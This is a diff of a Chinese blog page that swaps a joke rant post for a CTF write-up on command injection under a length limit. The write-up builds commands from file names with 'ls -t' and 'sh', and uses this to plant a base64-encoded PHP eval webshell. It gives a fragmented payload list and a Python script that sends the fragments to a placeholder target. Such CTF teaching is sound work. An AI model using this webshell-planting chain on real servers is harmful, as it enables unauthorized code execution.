@@ -16,24 +16,34 @@
   <meta name="author" content="Fanllspd">
   <meta name="keywords" content="blog">
   
-    <meta name="description" content="哈哈哈你来啦  我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！   为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不">
+    <meta name="description" content="有长度限制的RCE注入基本知识&gt;与&gt;&gt;我们知道Linux中，有&gt;和&gt;&gt;命令   我们可以通过&gt;来创建新文件    同时&gt;也可以用来往文件存入内容，但是使用&gt;会直接覆盖文件为你需要的内容，如果文件不存在，那么新建文件再放入你需要的内容    而&gt;&gt;则是往文件中追加新内容，不会覆盖原文件，同样的如果文件不存在也会新建文件再追加">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Fan11spd疯啦">
-<meta property="og:url" content="https://fanllspd.com/2023/10/16/MAIN/index.html">
+<meta property="og:title" content="有长度限制的RCE注入">
+<meta property="og:url" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Fanllspd&#39;s Blog">
-<meta property="og:description" content="哈哈哈你来啦  我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！   为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不">
+<meta property="og:description" content="有长度限制的RCE注入基本知识&gt;与&gt;&gt;我们知道Linux中，有&gt;和&gt;&gt;命令   我们可以通过&gt;来创建新文件    同时&gt;也可以用来往文件存入内容，但是使用&gt;会直接覆盖文件为你需要的内容，如果文件不存在，那么新建文件再放入你需要的内容    而&gt;&gt;则是往文件中追加新内容，不会覆盖原文件，同样的如果文件不存在也会新建文件再追加">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-10-16T15:51:51.871Z">
-<meta property="article:modified_time" content="2023-10-17T16:05:31.037Z">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209152729849.png">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209153007009.png">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209153252038.png">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209153724846.png">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209154124667.png">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209154743546.png">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209155053407.png">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209155525230.png">
+<meta property="og:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231018232631239.png">
+<meta property="article:published_time" content="2023-12-09T08:13:00.000Z">
+<meta property="article:modified_time" content="2023-12-09T08:13:41.953Z">
 <meta property="article:author" content="Fanllspd">
-<meta property="article:tag" content="blog">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fanllspd.com/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209152729849.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Fan11spd疯啦 - Fanllspd&#39;s Blog</title>
+  <title>有长度限制的RCE注入 - Fanllspd&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +209,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="看什么看？？！？！！"></span>
+            <span id="subtitle" data-typed-text="有长度限制的RCE注入"></span>
           
         </div>
 
@@ -210,8 +220,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-16 23:51" pubdate>
-          2023年10月16日 晚上
+        <time datetime="2023-12-09 16:13" pubdate>
+          2023年12月9日 下午
         </time>
       </span>
     
@@ -222,7 +232,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          923 字
+          1.4k 字
         
       </span>
     
@@ -233,7 +243,7 @@
         
         
         
-          8 分钟
+          12 分钟
         
       </span>
     
@@ -270,12 +280,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">看什么看？？！？！！</h1>
+            <h1 id="seo-header">有长度限制的RCE注入</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2 个月前
+                    本文最后更新于：1 分钟前
                   
                 
               </p>
@@ -283,18 +293,58 @@
             
               <div class="markdown-body">
                 
-                <h1 id="哈哈哈你来啦"><a href="#哈哈哈你来啦" class="headerlink" title="哈哈哈你来啦"></a>哈哈哈你来啦</h1><ul>
-<li><input checked disabled type="checkbox"> <h5 id="我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！"><a href="#我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！" class="headerlink" title="我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！"></a>我感觉我是真的疯了，我躺在床上会愤怒，我洗澡会愤怒，我出门会愤怒，我走路会愤怒，我坐车会愤怒，我玩手机会愤怒，我真的觉得自己像中邪了一样，我的愤怒似乎都是病态的了，我好孤独啊！真的好孤独啊！</h5></li>
-</ul>
+                <h1 id="有长度限制的RCE注入"><a href="#有长度限制的RCE注入" class="headerlink" title="有长度限制的RCE注入"></a>有长度限制的RCE注入</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="与"><a href="#与" class="headerlink" title="&gt;与&gt;&gt;"></a><code>&gt;</code>与<code>&gt;&gt;</code></h3><p>我们知道Linux中，有<code>&gt;</code>和<code>&gt;&gt;</code>命令</p>
 <blockquote>
-<h3 id="为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？"><a href="#为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？" class="headerlink" title="为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？"></a>为什么要笑？难道看到别人搞笑就要笑吗？你知不知道每次我看你笑我就想笑，笑多了我就长细纹了，对我的精神健康影响很大，我每次半夜起来一看这些搞笑视频我就大声嚎叫，觉得实在是太搞笑了，为什么你不叫？</h3></blockquote>
 <ul>
-<li><h2 id="阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开）-（尖叫）（扭曲）（阴暗的爬行）-（爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）"><a href="#阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开）-（尖叫）（扭曲）（阴暗的爬行）-（爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）" class="headerlink" title="阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开） （尖叫）（扭曲）（阴暗的爬行） （爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）"></a>阴暗的爬行）（吃头发）（尖叫）（无意识的乱爬）（哭泣）（挠头）（走来走去）（绊倒）（无意义地哭）（鬼嚎）（极速爬行）（攻击所有人）（在天花板上飞窜）（扑到别人脸上）（后空翻离开） （尖叫）（扭曲）（阴暗的爬行） （爬行）（扭动）（阴暗地蠕动）（翻滚）（激烈地爬动）（扭曲）（痉挛）（嘶吼）（蠕动）（阴森的低吼）（爬行）（分裂）（走上岸）（扭动）（痉挛）（蠕动）（扭曲的行走）（不分对象攻击）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）（创飞路过吃香蕉的猴子）（怒吼）（变成猴子）（飞进原始森林）（荡树藤）</h2></li>
+<li>我们可以通过<code>&gt;</code>来创建新文件</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fuckworld">console.log(printf(echo 还会再见吗，燕子？(勉强的微笑)再见时你要幸福，好不好(关车门)燕子，你要开心，你要幸福，好不好？开心<br>啊，幸福。你的世界以后没有我了，没关系，你要自己幸福。(嘶吼)燕子！燕子！(哭喊)燕子！没有你我怎么活啊，燕子！(奔跑)(嘶吼)燕子！<br>燕子啊(仰头45度哭泣)(面目狰狞)(不甘的追赶)(咆哮)(无力地喘气)燕子！燕子，你带我走吧，燕子啊(停下)(蹲下)(跪下)(哭泣)(嚎啕大<br>哭););)<br><br></code></pre></td></tr></table></figure>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209152729849.png" srcset="/img/loading.gif" lazyload alt="image-20231209152729849"></p>
+<ul>
+<li>同时<code>&gt;</code>也可以用来往文件存入内容，但是使用<code>&gt;</code>会直接覆盖文件为你需要的内容，如果文件不存在，那么新建文件再放入你需要的内容</li>
+</ul>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209153007009.png" srcset="/img/loading.gif" lazyload alt="image-20231209153007009"></p>
+<ul>
+<li><p>而<code>&gt;&gt;</code>则是往文件中追加新内容，不会覆盖原文件，同样的如果文件不存在也会新建文件再追加</p>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209153252038.png" srcset="/img/loading.gif" lazyload alt="image-20231209153252038"></p>
+</li>
+</ul>
+</blockquote>
+<h3 id="多行命令"><a href="#多行命令" class="headerlink" title="多行命令"></a>多行命令</h3><p>同样是在Linux中，我们可以采用在没写完的命令后写入<code>\</code>的方式，实现多行命令</p>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209153724846.png" srcset="/img/loading.gif" lazyload alt="image-20231209153724846"></p>
+<p>同时我们也可以将命令如上图一样写入文件，并使用<code>sh</code>执行该文件</p>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209154124667.png" srcset="/img/loading.gif" lazyload alt="image-20231209154124667"></p>
+<ul>
+<li>注意这里要使用<code>&gt;&gt;</code>追加命令</li>
+</ul>
+<h3 id="ls-t"><a href="#ls-t" class="headerlink" title="ls -t"></a><code>ls -t</code></h3><p>Linux中，<code>ls -t</code>可以让文件按照时间进行排序（时间靠后的排在前面）</p>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209154743546.png" srcset="/img/loading.gif" lazyload alt="image-20231209154743546"></p>
+<p>同时也可以与上述命令构造<code>ls -t &gt; cmd</code></p>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209155053407.png" srcset="/img/loading.gif" lazyload alt="image-20231209155053407"></p>
+<p>是不是跟<strong>多行命令</strong>中的很像，所以如果我们把文件名写为片段化的命令，就可以用<code>sh</code>来实现执行命令</p>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231209155525230.png" srcset="/img/loading.gif" lazyload alt="image-20231209155525230"></p>
+<p>之所以是<code>\\</code>是因为防止引号转义实际上只有一个<code>\</code>写入</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>访问题目地址</p>
+<p><img src="/2023/12/09/%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84RCE%E6%B3%A8%E5%85%A5/image-20231018232631239.png" srcset="/img/loading.gif" lazyload alt="rce-1"></p>
+<p>观察代码，filter函数中做了过滤，接下来的代码对Get的内容做了长度限制，可以用到我们上面学到的知识</p>
+<p>于是构造一下<code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment"># 需要写入的一句话木马</span><br><br>PD9waHAgZXZhbCgkX0dFVFsxXSk7 <span class="hljs-comment"># base64编码后</span><br></code></pre></td></tr></table></figure>
 
-<blockquote>
-<h1 id="请你不要生气-如果因为我的文字而骚扰到你-你可以来训我一顿-请不要因为我的这些行为而为我感到担心-我不重要的-我微不足道-我甚至可以和微生物相提并论-我的文字感动不了你似昆仑山上的冰山一般的心-没关系的-不回信息我也不会怎样的-我已经习惯了-已经习以为常了-我常常收不到你的信息-我甚至不知道是不是我手机的问题-就连一个表情包我也未曾收到-后来才发现这是你的问题-我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷-我都懂的-其实我也不是那么重要罢了"><a href="#请你不要生气-如果因为我的文字而骚扰到你-你可以来训我一顿-请不要因为我的这些行为而为我感到担心-我不重要的-我微不足道-我甚至可以和微生物相提并论-我的文字感动不了你似昆仑山上的冰山一般的心-没关系的-不回信息我也不会怎样的-我已经习惯了-已经习以为常了-我常常收不到你的信息-我甚至不知道是不是我手机的问题-就连一个表情包我也未曾收到-后来才发现这是你的问题-我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷-我都懂的-其实我也不是那么重要罢了" class="headerlink" title="请你不要生气 如果因为我的文字而骚扰到你 你可以来训我一顿 请不要因为我的这些行为而为我感到担心 我不重要的 我微不足道 我甚至可以和微生物相提并论 我的文字感动不了你似昆仑山上的冰山一般的心 没关系的 不回信息我也不会怎样的 我已经习惯了 已经习以为常了 我常常收不到你的信息 我甚至不知道是不是我手机的问题 就连一个表情包我也未曾收到 后来才发现这是你的问题 我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷 我都懂的 其实我也不是那么重要罢了"></a>请你不要生气 如果因为我的文字而骚扰到你 你可以来训我一顿 请不要因为我的这些行为而为我感到担心 我不重要的 我微不足道 我甚至可以和微生物相提并论 我的文字感动不了你似昆仑山上的冰山一般的心 没关系的 不回信息我也不会怎样的 我已经习惯了 已经习以为常了 我常常收不到你的信息 我甚至不知道是不是我手机的问题 就连一个表情包我也未曾收到 后来才发现这是你的问题 我的一字一字打出来的这些热情似火奔放自由的文字感动不了你这高高在上的爷 我都懂的 其实我也不是那么重要罢了</h1></blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php # 组合一下<br></code></pre></td></tr></table></figure>
+
+<p>解释一下</p>
+<ul>
+<li><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7</code> 是一个将Base64编码字符串输出到标准输出的命令</li>
+<li><code>base64 -d</code> 是一个Base64解码的命令。在这里，它将接收前一个命令输出的Base64编码字符串，并解码成原始的二进制数据</li>
+<li><code>&gt; 1.php</code> 将解码后的二进制数据保存到一个名为 <code>1.php</code> 的文件中</li>
+</ul>
+<p>命令挺长的所以我们可以写个脚本来自动执行一下</p>
+<p>payload.txt:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">hp</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.p\\</span><br><span class="language-bash">&gt;d\&gt;\\</span><br><span class="language-bash">&gt;\ -\\</span><br><span class="language-bash">&gt;e64\\</span><br><span class="language-bash">&gt;bas\\</span><br><span class="language-bash">&gt;7\|\\</span><br><span class="language-bash">&gt;XSk\\</span><br><span class="language-bash">&gt;Fsx\\</span><br><span class="language-bash">&gt;dFV\\</span><br><span class="language-bash">&gt;kX0\\</span><br><span class="language-bash">&gt;bCg\\</span><br><span class="language-bash">&gt;XZh\\</span><br><span class="language-bash">&gt;AgZ\\</span><br><span class="language-bash">&gt;waH\\</span><br><span class="language-bash">&gt;PD9\\</span><br><span class="language-bash">&gt;o\ \\</span><br><span class="language-bash">&gt;ech\\</span><br><span class="language-bash"><span class="hljs-built_in">ls</span> -t&gt;0</span><br>sh 0<br></code></pre></td></tr></table></figure>
+
+<p>脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://xxx/?6=&#123;0&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]start attack!!!&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span> + url.<span class="hljs-built_in">format</span>(i.strip()))<br>        requests.get(url.<span class="hljs-built_in">format</span>(i.strip()))<br><br><span class="hljs-comment"># 检查是否攻击成功</span><br>test = requests.get(<br>    <span class="hljs-string">&quot;http://xxx/sandbox/xxxx/1.php&quot;</span><br>)<br><span class="hljs-keyword">if</span> test.status_code == requests.codes.ok:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]Attack success!!!&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>现在访问<code>1.php</code>便可以正常的命令执行了</p>
 
                 
               </div>
@@ -304,6 +354,13 @@
               <div class="post-metas my-3">
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
 </div>
 
 
@@ -312,8 +369,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Fan11spd疯啦</div>
-      <div>https://fanllspd.com/2023/10/16/MAIN/</div>
+      <div>有长度限制的RCE注入</div>
+      <div>https://fanllspd.com/2023/12/09/有长度限制的RCE注入/</div>
     </div>
     <div class="license-meta">
       
@@ -325,7 +382,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年10月16日</div>
+          <div>2023年12月9日</div>
         </div>
       
       
@@ -357,18 +414,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/17/CNSS-2023-RecruitWp/" title="CNSS 2023 Recruit WriteUps~~~">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CNSS 2023 Recruit WriteUps~~~</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/10/16/Viking-2023-RecruitWp/" title="Viking 2023 Recruit WriteUps~~~">
-                        <span class="hidden-mobile">Viking 2023 Recruit WriteUps~~~</span>
+                      <a href="/2023/11/27/UESTC-iCoding-F1/" title="UESTC-iCoding-F1">
+                        <span class="hidden-mobile">UESTC-iCoding-F1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
